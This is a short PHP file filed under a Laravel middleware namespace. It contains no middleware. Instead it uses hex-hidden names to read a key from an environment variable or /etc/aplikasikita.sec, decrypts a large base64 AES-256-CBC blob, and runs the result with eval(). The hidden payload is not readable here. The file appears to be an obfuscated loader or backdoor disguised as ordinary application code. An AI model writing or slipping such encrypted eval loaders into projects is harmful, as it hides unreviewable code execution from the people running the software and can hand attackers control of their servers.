<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('OB5c41UYQkkAVHCHzSVblw==');

$c=base64_decode(

'yndXLD4rxP8/MX2TEUJJf4NM8VkgEhu3Or2r/JojTl7y+cHKULZR0H/h0tLa1b/QYTblsACZq48N' .
'y6yFP+W8Yu/HWmfH/NYLCorJHGY+WAxCfMEvSiW/n9KhuPvDzvgfh+UzrFBlS5zbzcfnsrxZ09/q' .
'z1iLbGT20pl47efYIULZLD8HJLToUA7pUEZ0Og7vYiacXOzXo9LT1FXxJYP0JFWPWgIRLpuLWpVF' .
'gIDWz58+6FbqM8i0gvbuDl/7mmIx93XLZmNAqyoH7EBp1ITOgfglM/lSudVYJJ/V194EdEIcSIcY' .
'WofqGERr74vx5fzwAtukcz/GQTPW8skYuoCA1gPOUolyTr6lrKWVulPfOeYrPgdyQz3YP1LmJpPU' .
'aqyKWiBQ3rwQXriVGzRBiiXLeeH5CwWHx6pG62NBagvOUFfN9ttu4hDLTy8DN4WA1p+WTGIksYU1' .
'IBIoxt2Jc/08JAFiDmtRM03UjWsQS5fvqC15safi+P59uN23uDWSk/snliFPZzDec+DvFY8vxOTw' .
'6vd8oZAydTv7mNNXGRO7otUuTzH5tRglGjMeCYhrCSCp3ljuugn3ZuvnqrVw3OC5Xxrkw7WagBLZ' .
'4CyELD81UQHADmuopeaTwZXonG7LzATSi/MZGbOb59qjvcVG9kDWrFJjNmVb6jBssOAC39Xm6j8F' .
'8x7dpQqz3CfMc2EQOrf7YMsjzKTerFSaBg1bvmJ/VBWYstb7zhOWZt2/CQon5YNCZc2vg3Nc6mjh' .
'3UCFmuVK44IzUOcJcd5qoy10r4wc8+5cYHG7vqllTeQja2IVUSBlPaYWvp+6xtMKeZXKPXTRD72t' .
'hn1+sT3AB6PDjKNqwRAIoiFixjIA4tysBx7Vx3BTFW1VxcbhrKgh64jw2CmKLRfuXnm7rXfbK977' .
'gLfF3mw5Bcgu6IR37TPvqiZweXq/5vZTHJo2eruJ1sFd3yYgYTbR7XF+rX70PFowCWnn/4KBRy/a' .
'qu+sVr54fyZ13by9NLbLZkym2c6DrPiEr35JUDhJque/xn0S29KeEMg6wuVLsVp/obB8asDLbR03' .
'jMLSmQUUMKm+b39dfDtLrGYyCPNmLcfcQWRrDaUlHpWWzUCIdt1C4JGAQDveb7bZtHjnuJprx68I' .
'CnuCtYeph9fz3AXffF/L6lgQsmV1qBPX6vMoYK0iSVxQTpj6/FrVA4PV6POpesA43fKVrOe5XrKY' .
'EOXQHNNT2lilfFnzPDU6+1b60tCNtqkT3YMYlfbjk7SRN1ES3ExVVJboUL4JJht2fGoM70AmFtJF' .
'2KnpVJ781BoNIfvNz07M8RsCndUT5EkpVC1LS0WM0xtN3tljqcTRH9O/BP8KWF7G7FOz4diNkPqE' .
'h+PE3W5RKmvnnM1zOCn78o4vpTytmiCz8O391t77l0A/lyqF92mQH4bPe9Q3k2zMXmRHvw3x35hQ' .
'/dLte1s5FGGzievFPJHZhPat3wnrk70yAY8BBuZCvzwvUVHe+AZitC9w2DKb0PxvwXy2GyBOJHrQ' .
'A6J4ZvLlSGeOGAWEE2uQZqJryu+xxVb2qIUSxg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

